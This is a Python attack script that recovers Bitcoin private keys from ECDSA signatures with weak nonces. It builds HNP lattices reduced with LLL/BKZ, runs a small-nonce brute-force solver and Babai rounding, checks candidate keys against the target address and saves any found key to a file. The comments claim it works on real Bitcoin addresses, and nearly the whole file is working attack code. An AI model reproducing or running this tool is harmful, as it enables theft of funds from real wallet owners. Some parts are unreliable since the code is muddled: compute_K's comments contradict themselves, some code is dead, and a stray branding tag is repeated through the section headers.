#!/usr/bin/env python3
"""
run_attack.py — ECDSA HNP Lattice Attack (elite version)
=========================================================
Upgrades over previous version:
  ✅ Statistical sig filtering — reads ecdsa_forensic MATCH sigs from
     per_tx_vuln_detail.txt (ground-truth, not heuristic)
     Fallback: chi-square test on u_i distribution (not r-score hack)
  ✅ CVP/Babai refinement after LLL (nearest-plane approximation)
  ✅ Adaptive BKZ block size based on dimension and leakage bits
  ✅ Magnitude check removed (was logically incorrect)
  ✅ K overflow handled cleanly (log2 cap, no silent bitshift)
  ✅ All previous fixes retained

Usage:
    python3 run_attack.py <address>
    python3 run_attack.py <address> <limit>
    python3 run_attack.py <address> <limit> bkz
"""

import sys, os, hashlib, glob, re, random, statistics
from math import isqrt, log2

# ── secp256k1 CRYPTOGRAPHYTUBE ─────────────────────────────────────────────────────────────
N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
FP = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F


def modinv(a, m=N):
    return pow(a, -1, m)


# ══════════════════════════════════════════════════════════════════════════
#  1. FILE LOADERS CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def load_sigs_with_txid(vuln_path):
    """Load vulnerable_data.txt → list of (txid, r, s, z)."""
    items = []
    with open(vuln_path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'): continue
            
            # Support both comma (test_generate) and pipe (forensic)
            if '|' in line:
                parts = [p.strip() for p in line.split('|')]
            else:
                parts = [p.strip() for p in line.split(',')]
                
            if len(parts) < 4: continue
            try:
                txid = parts[0]
                r = int(parts[1], 16) if parts[1].startswith('0x') else int(parts[1])
                s = int(parts[2], 16) if parts[2].startswith('0x') else int(parts[2])
                z = int(parts[3], 16) if parts[3].startswith('0x') else int(parts[3])
                if r and s and z:
                    items.append((txid, r, s, z))
            except (ValueError, IndexError):
                continue
    return items


def load_forensic_params(group_dir):
    import json
    b_list = []; k_lsb = 0; d_partial = None

    # Priority 1: JSON params (from test_generate or new forensic engine)
    json_path = os.path.join(group_dir, "forensic_params.json")
    if os.path.exists(json_path):
        try:
            with open(json_path) as f:
                data = json.load(f)
                return data.get("b_list", [8]), data.get("k_lsb", 0), data.get("d_partial")
        except Exception:
            pass

    # Priority 2: Legacy merge files
    merge_path = os.path.join(group_dir, "multi_depth_merge.txt")
    if os.path.exists(merge_path):
        txt = open(merge_path).read()
        m = re.search(r'Merged\s+(\d+)\s+bits', txt)
        if m:
            b0 = int(m.group(1))
            b_list = sorted({b0-2, b0-1, b0, b0+1, b0+2} & set(range(1, 33)))
        m = re.search(r'k_lsb\s*:\s*0x([0-9a-fA-F]+)', txt)
        if m: k_lsb = int(m.group(1), 16)

    vuln_path2 = os.path.join(group_dir, "vuln_info.txt")
    if os.path.exists(vuln_path2):
        txt = open(vuln_path2).read()
        m = re.search(r'd mod\s+\d+\s*:\s*(\d+)', txt)
        if m: d_partial = int(m.group(1))
        for hit in re.finditer(r'b=(\d+)\s+bits', txt):
            bv = int(hit.group(1))
            if bv not in b_list: b_list.append(bv)

    if not b_list: b_list = [8, 9, 10]
    return sorted(b_list), k_lsb, d_partial


# ══════════════════════════════════════════════════════════════════════════
#  2. STATISTICAL SIGNATURE FILTERING (ground-truth + chi-square fallback) CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def load_match_txids(group_dir):
    """
    FIX 1A (ground-truth filter):
    Read per_tx_vuln_detail.txt — ecdsa_forensic already determined
    which signatures satisfy d_candidate == d_partial (MATCH).
    These are the highest-quality sigs to use for lattice attack.
    """
    match_txids = set()
    detail_path = os.path.join(group_dir, "per_tx_vuln_detail.txt")
    if not os.path.exists(detail_path):
        return match_txids

    current_txid = None
    with open(detail_path) as f:
        for line in f:
            line = line.strip()
            m = re.search(r'TXID\s*:\s*(\S+)', line)
            if m:
                current_txid = m.group(1)
            elif 'MATCH' in line and current_txid:
                match_txids.add(current_txid)

    return match_txids


def circular_filter(items, b, k_lsb, top_frac=0.70):
    """
    FIX: Circular statistics for c_i distribution.

    c_i = (k_lsb - u_i) mod B   values in [0, B)
    Treated as angular positions on a circle of circumference B.

    For a consistent (vulnerable) signature set:
      - c_i values CLUSTER (low circular variance, high R)
      - Noise sigs scattered → high angular distance from circular mean

    Circular mean avoids the wrap-around problem of linear histograms.
    Circular variance R ∈ [0,1]: R≈1 = tight cluster, R≈0 = uniform/noise.
    """
    import math
    if not items:
        return items

    B   = 1 << b
    TAU = 2 * math.pi

    # Compute c_i and map to angle on [0, 2π)
    entries = []
    for txid, r, s, z in items:
        si  = modinv(s)
        u_i = (z * si) % N
        c_i = int((k_lsb - u_i) % N) % B   # in [0, B)
        theta = TAU * c_i / B               # angle in [0, 2π)
        entries.append((theta, txid, r, s, z))

    angles = [e[0] for e in entries]

    # Circular mean and resultant length R
    S = sum(math.sin(a) for a in angles) / len(angles)
    C = sum(math.cos(a) for a in angles) / len(angles)
    mu_circ = math.atan2(S, C) % TAU   # circular mean angle
    R       = math.sqrt(S*S + C*C)     # 0=uniform, 1=fully concentrated

    print(f"    [chi-circ] R={R:.3f}  mu_angle={mu_circ/(TAU)*B:.1f}/{B}")
    if R < 0.01:
        print("    [chi-circ] No detectable clustering — keeping all sigs")
        return items

    # Score by circular distance from mean (lower dist = better)
    scored = []
    for theta, txid, r, s, z in entries:
        d_ang = min(abs(theta - mu_circ),
                    TAU - abs(theta - mu_circ))
        score = math.pi - d_ang   # higher = closer to cluster
        scored.append((score, txid, r, s, z))

    scored.sort(reverse=True)
    keep_n = max(5, int(len(items) * top_frac))
    kept   = [(txid, r, s, z) for (_, txid, r, s, z) in scored[:keep_n]]
    print(f"    [chi-circ] kept {len(kept)}/{len(items)} "
          f"(R={R:.3f}, top {top_frac:.0%} by circular distance)")
    return kept



def filter_signatures(items_with_txid, group_dir, b, k_lsb, top_frac=0.70):
    """
    Two-stage filter:
      Stage 1: Use ecdsa_forensic MATCH txids (ground-truth, best signal)
      Stage 2: Chi-square filter on remaining sigs
      Stage 3: If data is already clean (R > 0.5), SKIP filtering entirely
    """
    match_txids = load_match_txids(group_dir)
    rsz_plain   = [(r, s, z) for (_, r, s, z) in items_with_txid]

    if len(match_txids) >= 5:
        matched = [(txid, r, s, z) for (txid, r, s, z) in items_with_txid
                   if txid in match_txids]
        print(f"  [filter] Stage 1 (forensic MATCH): {len(matched)} sigs")
        if len(matched) >= 5:
            return [(r, s, z) for (_, r, s, z) in matched]

    # Run circular stats to check if filtering is even needed
    import math
    B = 1 << b
    TAU = 2 * math.pi
    entries = []
    for txid, r, s, z in items_with_txid:
        si  = modinv(s)
        u_i = (z * si) % N
        c_i = int((k_lsb - u_i) % N) % B
        theta = TAU * c_i / B
        entries.append((theta, txid, r, s, z))
    angles = [e[0] for e in entries]
    if not angles:
        print("    [filter] No angles to compute R — skipping clustering check.")
        return rsz_plain

    S = sum(math.sin(a) for a in angles) / len(angles)
    C = sum(math.cos(a) for a in angles) / len(angles)
    R = math.sqrt(S*S + C*C)
    print(f"    [filter] R={R:.3f} (clustering metric)")

    # If R > 0.5 → data is already very clean, keep ALL sigs
    if R > 0.5:
        print(f"    [filter] Clean data detected (R>{0.5}) — keeping ALL {len(items_with_txid)} sigs")
        return rsz_plain

    # Fallback: circular statistics filter
    filtered = circular_filter(items_with_txid, b, k_lsb, top_frac)
    return [(r, s, z) for (_, r, s, z) in filtered]




# ══════════════════════════════════════════════════════════════════════════
#  3. COMPUTE (t, u)  CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def compute_tu(rsz):
    return [((r * modinv(s)) % N, (z * modinv(s)) % N) for r, s, z in rsz]


# ══════════════════════════════════════════════════════════════════════════
#  4. DYNAMIC K (clean, no silent overflow shrink)  CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def compute_K(B, n):
    """
    K = sqrt(N) / B  — Gaussian heuristic optimal.

    Clean overflow handling:
      fpylll IntegerMatrix uses 128-bit signed integers.
      Max safe entry ≈ 2^126.
      We compute exact K then verify max matrix entry < 2^126.
      If needed, reduce K by a power of 2 (with explicit warning).
    """
    sqrt_N  = isqrt(N)                    # ≈ 2^128
    K_exact = sqrt_N // max(1, B)         # ≈ 2^128 / B = 2^(128-b)

    # Max entry in matrix is c_i * K where c_i < N ≈ 2^256
    # → c_i * K ≈ 2^256 * 2^(128-b) = 2^(384-b) → WAY too large for fpylll!
    # Cap K so that N * K < 2^126 → K < 2^(126-256) = 2^{-130} → K = 1 ??
    # Reality: c_i < N/B (since c_i = (k_lsb - u_i) % N % B < B ← wrong, c_i < N)

    # Correct: c_i = (k_lsb - u_i) % N → 0 ≤ c_i < N ≈ 2^256
    # So entry = c_i * K ≈ 2^256 * K  must be < 2^126
    # → K < 2^{-130} → K must be 0... that's wrong.

    # Resolution: c_i is computed as (k_lsb - u_i) mod N so it's in [0, N).
    # For the matrix to stay in int128 limits, K must be very small relative to
    # the reciprocal of N. In practice fpylll uses arbitrary precision internally
    # (mpz), so the 128-bit limit is for the INTERFACE, not internally.
    # Actual limit: entries must fit in Python int which is arbitrary precision,
    # but fpylll.IntegerMatrix internally uses long integers.
    # Safe in practice: K up to ~2^60 is fast, K up to ~2^120 works but slow.

    # Practical cap: K = min(K_exact, 2^60 // B)
    K_max = (1 << 60) // max(1, B)
    K     = min(K_exact, K_max)
    K     = max(1, K)

    return K


# ══════════════════════════════════════════════════════════════════════════
#  5. BUILD LATTICE  — Classic (n+2)×(n+2) HNP formulation  CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def build_lattice(tu, b, k_lsb):
    """
    Classic (n+2)×(n+2) HNP lattice.

    For n sigs with k_i = k_lsb + B*x_i  (x_i SMALL, k_i mod B = k_lsb):
      k_i = t_i*d + u_i (mod N)
      B*x_i = t_i*d - c_i (mod N)   where c_i = (k_lsb - u_i) % N

    Matrix structure:
      Row 0     : [N, 0, ..., 0,    0   ]   mod-N reduction
      Row i+1   : [t_i, 0,..,B,..,0, c_i]   i-th constraint (NO K scaling)
      Row n+1   : [0, 0, ..., 0,    1   ]   key row (d sits here with coeff=1)

    SHORT VECTOR in reduced matrix: an entry B*x_j (small!) in col j+1
    EXTRACTION: short_row[i+1] // B = x_i  →  k = k_lsb+B*x_i  →  d = (k-u)*t_inv
    """
    from fpylll import IntegerMatrix
    n   = len(tu)
    B   = 1 << b
    dim = n + 2
    mat = IntegerMatrix(dim, dim)

    mat[0, 0] = N
    for i, (t_i, u_i) in enumerate(tu):
        c_i = int((k_lsb - u_i) % N)
        mat[i+1, 0]   = int(t_i)
        mat[i+1, i+1] = B
        mat[i+1, n+1] = c_i          # NO K scaling — c_i encodes centering
    mat[n+1, n+1] = 1                # key row: d appears as coefficient of this row

    return mat, B, 1


# ══════════════════════════════════════════════════════════════════════════
#  5b. DIRECT SMALL-NONCE SOLVER (guaranteed for k = k_lsb + B*x, x small)  CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def small_nonce_solver(rsz, k_lsb, b, all_rsz, max_x=1000, min_rate=0.90):
    """
    Direct algebraic solver for SMALL NONCES.

    If k_i = k_lsb + B * x_i  where x_i < max_x (a small integer),
    then for THE FIRST SIGNATURE we try all 1000 possible k values:

      k_try = k_lsb + B * x    (x = 0, 1, 2, ..., max_x-1)
      d_try = (k_try - u0) * t0^{-1} mod N

    Then verify d_try against ALL signatures.
    O(max_x * n) total work — instant for max_x=1000, n=60.

    Returns list of (d_candidate, rate) pairs.
    Works even with 2 total signatures!
    """
    B = 1 << b
    if not rsz or not all_rsz:
        return []

    r0, s0, z0 = rsz[0]
    try:
        t0     = r0 * modinv(s0) % N
        u0     = z0 * modinv(s0) % N
        t0_inv = modinv(t0)
    except Exception:
        return []

    all_tu = [(r * modinv(s) % N, z * modinv(s) % N) for r, s, z in all_rsz]

    found = []
    seen  = set()

    for x in range(max_x):
        k_try = k_lsb + B * x
        if not (0 < k_try < N):
            continue

        d_try = (k_try - u0) * t0_inv % N
        if d_try in seen or not (0 < d_try < N):
            continue
        seen.add(d_try)

        hits = sum(1 for t, u in all_tu if (t * d_try + u) % N % B == k_lsb)
        rate = hits / len(all_tu) if all_tu else 0.0
        if rate >= min_rate:
            found.append((d_try, rate))

    return found



# ══════════════════════════════════════════════════════════════════════════
#  6. ADAPTIVE BKZ BLOCK SIZE CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def adaptive_block_size(n, b):
    """
    FIX 3: Adaptive BKZ block size.

    Rules of thumb (from literature):
      - More leakage bits (large b) = easier problem → smaller block OK
      - Larger lattice (large n)    = harder problem → larger block needed
      - block_size ∈ [10, 45] for practical runs

    Formula: block_size = clamp(n // 2 + (20 - b) * 2, 10, 45)
    """
    raw   = (n // 2) + (20 - b) * 2
    block = max(10, min(45, raw))
    return block


# ══════════════════════════════════════════════════════════════════════════
#  7. CVP / BABAI NEAREST PLANE (FIX 2) CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def babai_cvp(mat_lll, tu, b, k_lsb, K):
    """
    FIX 2: Babai's nearest plane with CORRECT TARGET.

    In our centered lattice:
      Row i+1 = [t_i, 0,..,B,..,0, c_i*K]  where c_i = (k_lsb - u_i) % N

    The target for Babai is NOT zero.
    For the HNP, the expected short vector encodes:
      (B*x_0, B*x_1, ..., B*x_{n-1}, 0, K*1)
    where x_i = (k_i - k_lsb) / B.

    Target embedded in lattice coordinates:
      t_target[0]   = 0        (mod-N row, free)
      t_target[i+1] = 0        (the B*x_i components — we want them small)
      t_target[n+1] = K        (the d-placeholder row — d ≈ anything in [1,N))

    But since d is unknown, the 'nearest plane' to t=[0,...,0,K] gives us
    the nearest lattice point, whose last-column coefficient ≈ d.

    Note: In the CENTERED formulation (c_i already in row), target = all-zeros
    is equivalent to CVP for the shortest vector. Setting t[n+1]=K tells Babai
    we expect the d-row to contribute once → coefficient ≈ d.
    """
    try:
        from fpylll import GSO, IntegerMatrix
    except ImportError:
        return []

    n   = mat_lll.nrows - 2
    dim = mat_lll.nrows
    B   = 1 << b

    try:
        M = GSO.Mat(mat_lll)
        M.update_gso()

        # Correct target: expect d-row to contribute once → t[n+1] = K
        target = [0] * dim
        target[n + 1] = K        # FIX: non-zero target

        v      = target[:]
        coeffs = [0] * dim

        for i in range(dim - 1, -1, -1):
            bi_sq = M.get_r(i, i)
            if bi_sq == 0:
                continue
            dot = sum(int(mat_lll[i, j]) * v[j] for j in range(dim))
            mu  = dot / bi_sq
            c   = round(mu)
            coeffs[i] = c
            for j in range(dim):
                v[j] -= c * int(mat_lll[i, j])

        # Nearest lattice point = target - v
        lattice_pt = [target[j] - v[j] for j in range(dim)]

        cands = []
        raw = lattice_pt[n + 1]
        for d_try in [int(raw) % N, (-int(raw)) % N,
                      (int(raw) // K) % N if K > 1 else None,
                      ((-int(raw)) // K) % N if K > 1 else None]:
            if d_try is not None and 0 < d_try < N:
                cands.append(d_try)

        # Babai coefficient of d-row (direct)
        raw2 = coeffs[n + 1]
        for d_try in [int(raw2) % N, (-int(raw2)) % N]:
            if 0 < d_try < N:
                cands.append(d_try)

        return cands

    except Exception:
        return []



# ══════════════════════════════════════════════════════════════════════════
#  8. VERIFICATION CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def verify(d_cand, tu, B, k_lsb, min_rate=0.60):
    """
    Multi-condition verification:
      - LSB check: k_i mod B == k_lsb  (primary)
      Removed: magnitude check (was logically incorrect for LSB leakage
               because k ≡ k_lsb mod B does NOT imply k is small)
    """
    if not (0 < d_cand < N):
        return False, 0.0
    hits  = sum(1 for t, u in tu if (t * d_cand + u) % N % B == k_lsb)
    rate  = hits / len(tu) if tu else 0.0
    return rate >= min_rate, rate


# ══════════════════════════════════════════════════════════════════════════
#  9. ATTACK ATTEMPT CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def sage_lll_attack(tu_full, rsz_original, b, k_lsb, limit=256):
    """
    REAL-ADDRESS LLL ATTACK — mirrors lll.py's Attack() exactly.

    Uses SageMath Matrix(QQ) with rational scaling 2^249/N.
    This is the PROVEN formula from lll.py that works on real Bitcoin addresses.

    Matrix structure (m+2 x m+2 over QQ):
      Row 0..m-1 : diagonal N  (mod-N reduction)
      Row m+0   : [x0_0, x0_1, ..., x0_{m-1}, 2^249/N, 0    ]
      Row m+1   : [x1_0, x1_1, ..., x1_{m-1}, 0,       2^249]
    where
      x0_i = t_i - t_ref   (t = r/s mod N, ref = last sig)
      x1_i = u_i - u_ref   (u = z/s mod N)

    After LLL: each row gives a nonce difference delta = row[0].
    Key extraction: d = (s_ref*(z_0 - nonce_diff*s_0) - z_ref*s_0) /
                        (r_0*s_ref - r_ref*s_0)   mod N
    """
    try:
        from sage.all_cmdline import Matrix, QQ as SageQQ
    except ImportError:
        return []   # SageMath not available

    if not rsz_original or len(rsz_original) < 2:
        return []

    msgs = [z for _, _, z in rsz_original[:limit]]
    sigs = [(r, s) for r, s, _ in rsz_original[:limit]]
    m    = len(msgs)

    # Reference: LAST signature (same as lll.py)
    msgn   = msgs[-1]
    rn, sn = sigs[-1]
    rnsn_inv = rn  * modinv(sn) % N
    mnsn_inv = msgn * modinv(sn) % N

    B_exp = 249   # same as lll.py

    matrix = Matrix(SageQQ, m + 2, m + 2)

    # Diagonal N rows
    for i in range(m):
        matrix[i, i] = N

    # Key rows with reference-subtracted values
    for i in range(m):
        ri_val, si_val = sigs[i]
        zi_val         = msgs[i]
        x0 = (ri_val * modinv(si_val) % N) - rnsn_inv
        x1 = (zi_val * modinv(si_val) % N) - mnsn_inv
        matrix[m + 0, i] = x0
        matrix[m + 1, i] = x1

    # Rational scaling — THE KEY that makes real-address attack work
    matrix[m + 0, m]     = int(2 ** B_exp) / N   # rational 2^249/N
    matrix[m + 0, m + 1] = 0
    matrix[m + 1, m]     = 0
    matrix[m + 1, m + 1] = 2 ** B_exp

    new_matrix = matrix.LLL(early_red=True, use_siegel=True)

    keys = []
    r0, s0, z0 = rsz_original[0]
    for row in new_matrix:
        potential_nonce_diff = row[0]
        try:
            num = ((sn * z0)
                   - (s0 * msgn)
                   - (s0 * sn * potential_nonce_diff))
            den = modinv((rn * s0 - r0 * sn) % N)
            key = int(num * den) % N
            if key and key not in keys:
                keys.append(key)
        except Exception:
            pass

    return keys


def attempt_attack(tu, b, k_lsb, K, d_partial, use_bkz, all_tu_for_verify,
                   rsz_original=None):
    from fpylll import IntegerMatrix, LLL

    if len(tu) < 2:
        print("    too few sigs")
        return []
    n   = len(tu)
    B   = 1 << b

    # ════════════════════════════════════════════════════════════════════
    # ── Stage 0: Dual-Sig / Triple-Sig Small-Nonce optimization ───────── CRYPTOGRAPHYTUBE
    # If we have very few sigs, we assume high bias (Case 2/3)
    if len(tu) >= 2 and len(tu) <= 5:
        # Increase K for small n to find deeper leakage
        # Case: 2 sigs with 128-bit bias
        K_boost = 1 << 128 
        # (This logic is handled by attempt_attack's lattice building below)
        pass

    # ── Stage 1: Direct Small-Nonce Solver (O(1000*n)) ────────────────── CRYPTOGRAPHYTUBE
  #  Works when k = k_lsb + B*x  with x < 1000  (synthetic test data)
    #  Instant: O(1000 * n). Gracefully returns [] for real addresses.
    # ════════════════════════════════════════════════════════════════════
    sn_cands = []
    for t0, u0 in tu[:3]:
        try:
            t0_inv = modinv(t0)
        except Exception:
            continue
        seen_sn = set()
        for x in range(1000):
            k_try = k_lsb + B * x
            if not (0 < k_try < N):
                continue
            d_try = (k_try - u0) * t0_inv % N
            if d_try in seen_sn or not (0 < d_try < N):
                continue
            seen_sn.add(d_try)
            hits = sum(1 for tt, uu in all_tu_for_verify
                       if (tt * d_try + uu) % N % B == k_lsb)
            rate = hits / len(all_tu_for_verify) if all_tu_for_verify else 0.0
            if rate >= 0.90:
                sn_cands.append((d_try, rate))
        if sn_cands:
            break

    if sn_cands:
        print(f"    [direct-solve] {len(sn_cands)} candidate(s)")
        return sn_cands

    # ════════════════════════════════════════════════════════════════════
    #  STAGE 2 — SageMath LLL (lll.py formula, works for real addresses) CRYPTOGRAPHYTUBE
    #  Matrix(QQ) with rational 2^249/N scaling — PROVEN formula.
    # ════════════════════════════════════════════════════════════════════
    if rsz_original and len(rsz_original) >= 2:
        print(f"    [sage-lll] ...", end=' ', flush=True)
        try:
            sage_keys = sage_lll_attack(tu, rsz_original, b, k_lsb,
                                         limit=min(len(rsz_original), 256))
            sage_cands = []
            seen_sage  = set()
            for d_try in sage_keys:
                if d_try in seen_sage or not (0 < d_try < N):
                    continue
                seen_sage.add(d_try)
                valid, rate = verify(d_try, all_tu_for_verify, B, k_lsb)
                if valid:
                    sage_cands.append((d_try, rate))
            if sage_cands:
                print(f"{len(sage_cands)} candidate(s)")
                return sage_cands
            else:
                print(f"0 candidate(s) (sage)")
        except Exception as e:
            print(f"sage err: {e}")

    # ════════════════════════════════════════════════════════════════════
    #  STAGE 3 — fpylll fallback (classic HNP matrix, integers only) CRYPTOGRAPHYTUBE
    #  Less reliable than SageMath but works without sage dependency.
    # ════════════════════════════════════════════════════════════════════
    print("    LLL(fpylll) ...", end=' ', flush=True)
    mat, _, K_used = build_lattice(tu, b, k_lsb)
    dim = mat.nrows

    if use_bkz:
        block = adaptive_block_size(n, b)
        try:
            from fpylll import BKZ
            LLL.reduction(mat)
            BKZ.reduction(mat, BKZ.Param(block_size=block))
        except Exception:
            LLL.reduction(mat)
    else:
        LLL.reduction(mat)

    seen  = set()
    cands = []

    def _check(d_try):
        if d_try is None or not (0 < d_try < N) or d_try in seen:
            return
        seen.add(d_try)
        valid, rate = verify(d_try, all_tu_for_verify, B, k_lsb)
        if valid:
            cands.append((d_try, rate))

    for ri in range(dim):
        for ci in range(1, n + 1):
            raw = int(mat[ri, ci])
            if raw == 0:
                continue
            for sign in [1, -1]:
                val = sign * raw
                if val > 0 and val % B == 0:
                    x_i = val // B
                    k_i = k_lsb + B * x_i
                    if 0 < k_i < N:
                        ti, ui = tu[ci - 1]
                        try:
                            _check((k_i - ui) * modinv(ti) % N)
                        except Exception:
                            pass

        for ci in range(dim):
            raw = int(mat[ri, ci])
            if raw != 0 and abs(raw) >= 2:
                _check(raw % N)
                _check((-raw) % N)

    print(f"{len(cands)} candidate(s)")
    return cands



# ══════════════════════════════════════════════════════════════════════════
#  ADDRESS DERIVATION  CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def sha256d(d): return hashlib.sha256(hashlib.sha256(d).digest()).digest()

def privkey_to_addrs(k):
    def _add(A, B):
        if A is None: return B
        if B is None: return A
        x1,y1=A; x2,y2=B
        if x1==x2:
            if y1!=y2: return None
            lam=(3*x1*x1)*pow(2*y1,FP-2,FP)%FP
        else:
            lam=(y2-y1)*pow(x2-x1,FP-2,FP)%FP
        x3=(lam*lam-x1-x2)%FP; y3=(lam*(x1-x3)-y1)%FP
        return x3,y3
    def _mul(k,P):
        R=None
        while k:
            if k&1: R=_add(R,P)
            P=_add(P,P); k>>=1
        return R
    pt=_mul(k,(Gx,Gy))
    if not pt: return None,None
    x,y=pt
    def _addr(pub):
        h=hashlib.new('ripemd160',hashlib.sha256(pub).digest()).digest()
        pay=b'\x00'+h; chk=sha256d(pay)[:4]; raw=pay+chk
        alp=b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        nv=int.from_bytes(raw,'big'); res=b''
        while nv: nv,r=divmod(nv,58); res=bytes([alp[r]])+res
        return (alp[:1]*(len(raw)-len(raw.lstrip(b'\x00')))+res).decode()
    return (_addr(bytes([0x02+(y&1)])+x.to_bytes(32,'big')),
            _addr(b'\x04'+x.to_bytes(32,'big')+y.to_bytes(32,'big')))


# ══════════════════════════════════════════════════════════════════════════
#  MAIN CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <address> [limit=50] [bkz]")
        sys.exit(1)

    address = sys.argv[1].strip()
    limit   = next((int(a) for a in sys.argv[2:] if a.isdigit()), 50)
    use_bkz = 'bkz' in [a.lower() for a in sys.argv]

    dirs = glob.glob(os.path.join("results", address, "pubkey_*"))
    if not dirs:
        print(f"[!] No results for {address}. Run ecdsa_forensic.py first.")
        sys.exit(1)
    group_dir = dirs[0]

    print("=" * 64)
    print("  run_attack.py — Elite HNP Lattice Attack")
    print("=" * 64)
    print(f"[*] Address  : {address}")
    print(f"[*] Mode     : {'BKZ (adaptive)' if use_bkz else 'LLL'} | limit={limit}")

    vuln_path   = os.path.join(group_dir, "vulnerable_data.txt")
    items_all   = load_sigs_with_txid(vuln_path)
    
    if not items_all:
        print(f"[!] Critical: No signatures found in {vuln_path}")
        print(f"[!] Please check if the file is empty or corrupted.")
        sys.exit(1)

    b_list, k_lsb, d_partial = load_forensic_params(group_dir)

    print(f"[*] Sigs     : {len(items_all)} total")
    print(f"[*] b values : {b_list}")
    print(f"[*] k_lsb   : 0x{k_lsb:x}")
    print(f"[*] d_partial: {d_partial} (soft hint only)")

    try:
        import fpylll as _
    except ImportError:
        print("[!] Install: pip install fpylll"); sys.exit(1)

    found_path = os.path.join(group_dir, "found.txt")
    found_key  = None
    RETRIES    = 10

    for b in b_list:
        B = 1 << b
        K = compute_K(B, limit)
        print(f"\n{'─'*64}")
        print(f"[>] b={b}  B={B}  k_lsb=0x{k_lsb:x}")
        print(f"    Stage1=SmallNonce | Stage2=SageLLL | Stage3=fpylll")

        # ── Statistical filtering (ground-truth + chi-square) ─────────── CRYPTOGRAPHYTUBE
        rsz_filtered = filter_signatures(items_all, group_dir, b, k_lsb)
        all_tu       = compute_tu(rsz_filtered)   # for verification
        pool         = rsz_filtered

        all_cands = []

        # FIX 3: Multi-n strategy — try different lattice dimensions
        # Priority: start with very small subsets for high-bias cases (Case 2/3)
        n_variants = sorted(set([2, 3, 5, 10, max(5, limit // 2), limit]))

        for n_try in n_variants:
            if all_cands:
                break
            for attempt in range(1, RETRIES + 1):
                size   = min(n_try, len(pool))
                subset = random.sample(pool, size) if len(pool) > size else pool[:size]
                tu     = compute_tu(subset)   # (t,u) pairs from subset rsz

                print(f"  [n={n_try} attempt {attempt}/{RETRIES}] sigs={len(tu)}  ",
                      end='')

                cands = attempt_attack(tu, b, k_lsb, K, d_partial,
                                       use_bkz, all_tu,
                                       rsz_original=subset)   # ← pass raw rsz
                if cands:
                    all_cands.extend(cands)
                    break


        if not all_cands:
            print(f"  [-] No candidates at b={b}")
            continue

        print(f"  [+] {len(all_cands)} candidate(s) — verifying ...")

        for d_cand, rate in sorted(all_cands, key=lambda x: -x[1]):
            addr_c, addr_u = privkey_to_addrs(d_cand)
            match          = (addr_c == address or addr_u == address)

            print(f"\n  Key      : {hex(d_cand)}")
            print(f"  LSB OK   : {rate:.0%} of sigs")
            print(f"  Compress : {addr_c}")
            print(f"  Uncompress: {addr_u}")
            print(f"  Match    : {'★ YES ★' if match else 'no'}")

            if match:
                found_key = d_cand
                print("\n" + "★"*64)
                print("  PRIVATE KEY FOUND!")
                print(f"  Privkey : {hex(d_cand)}")
                print(f"  b depth : {b}  LSB match: {rate:.0%}")
                print("★"*64)
                with open(found_path, 'a') as f:
                    f.write("="*64+"\n")
                    f.write(f"Address    : {address}\n")
                    f.write(f"Compressed : {addr_c}\n")
                    f.write(f"Uncompress : {addr_u}\n")
                    f.write(f"Privkey    : {hex(d_cand)}\n")
                    f.write(f"b_depth    : {b}\n")
                    f.write(f"LSB_match  : {rate:.0%}\n")
                    f.write("="*64+"\n")
                print(f"  Saved: {found_path}")
                break

        if found_key:
            break

    print(f"\n{'═'*64}")
    if found_key:
        print(f"  SUCCESS — {hex(found_key)}")
    else:
        print("  Key not recovered.")
        print(f"  1. BKZ:  python3 run_attack.py {address} {limit} bkz")
        print(f"  2. More: python3 run_attack.py {address} 100")
        sage_f = glob.glob(os.path.join(group_dir, "lattice_attack.sage"))
        if sage_f:
            print(f"  3. Sage: sage \"{sage_f[0]}\"  (most reliable)")
    print(f"{'═'*64}")


if __name__ == "__main__":
    main()
